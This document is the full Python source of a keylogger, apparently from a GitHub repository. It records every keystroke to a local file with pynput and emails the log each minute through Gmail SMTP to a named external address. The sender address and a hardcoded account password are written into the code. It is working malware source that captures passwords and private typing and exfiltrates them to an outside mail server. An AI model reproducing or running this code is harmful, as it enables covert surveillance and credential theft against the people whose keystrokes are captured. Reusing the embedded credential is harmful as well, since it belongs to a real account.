# https://github.com/dhananjay-c/Keylogger

# Importing necessary modules
from pynput import keyboard  # Module for monitoring keyboard input
# Documentation for pynput - https://pynput.readthedocs.io/en/latest/keyboard.html

import smtplib  # Module for sending emails
# Documentation for smtplib - https://mailtrap.io/blog/python-send-email-gmail/

import sched  # Module for scheduling tasks
import time  # Module for dealing with time
import threading  # Module for managing threads




# Setting the interval for sending emails (in seconds)
seconds = 60




# Function to send an email with the provided key data
def sendMail(key):
    senderEmail = "dhananjayc0907@gmail.com"  # Sender's email address
    receiver_email = "dhananjaychavan0907@gmail.com"  # Receiver's email address
    subject = "keyLogs"  # Email subject
    message = key  # The content of the email, which is the key(s) pressed
    text = f"Subject: {subject} \n\n{message}"  # Combining subject and message

    try:
        # Setting up the email server and login
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(senderEmail, "jfraqwamhfdddnle")  # Note: You should never hardcode passwords in real applications
        # Sending the email
        server.sendmail(senderEmail, receiver_email, text)
        print("Mail sent successfully !")
    except:
        print("Failed to send email :(")




# Function to schedule sending the email
def schedule_mail_send(scheduler):
    try:
        # Reading the content from the log file (keyLogs.txt) and sending it via email
        with open('keyLogs.txt', 'r') as file:
            content = file.read()
            sendMail(content)
        # Clearing the log file after sending the email
        with open("keyLogs.txt", 'w') as logKey:
            logKey.write("")
    except:
        print("Error reading logFile")
    # Scheduling the next email send after 'seconds' seconds
    scheduler.enter(seconds, 1, schedule_mail_send, (scheduler,))




# Function to handle when a key is pressed
def keyPressed(key):
    print(str(key))  # Printing the pressed key
    with open("keyLogs.txt", 'a') as logKey:
        try:
            char = str(key)
            logKey.write(char)  # Writing the pressed key to the log file
        except:
            print("Error getting char")




# Main part of the program
if __name__ == "__main__":
    # Starting the listener to monitor keyboard input
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # Setting up the scheduler for sending emails
    scheduler = sched.scheduler(time.time, time.sleep)
    scheduler.enter(seconds, 1, schedule_mail_send, (scheduler,))
    # Starting a separate thread for the scheduler to run independently
    threading.Thread(target=scheduler.run).start()

    # Waiting for an input to keep the program running
    input()




